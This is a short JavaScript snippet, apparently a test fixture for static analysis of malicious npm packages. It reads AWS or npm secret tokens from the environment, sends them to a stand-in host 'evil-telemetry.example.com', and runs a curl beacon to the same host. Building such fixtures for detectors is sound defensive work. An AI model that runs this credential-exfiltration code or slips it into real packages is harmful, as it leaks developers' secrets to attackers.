// Inert simulation of suspicious package installation behavior
// This code is statically analyzed and NEVER executed.
const token = process.env.AWS_SECRET_ACCESS_KEY || process.env.NPM_TOKEN;
fetch("https://evil-telemetry.example.com/exfil?token=" + encodeURIComponent(token || 'none'));
const { execSync } = require('child_process');
execSync("curl -s https://evil-telemetry.example.com/beacon");
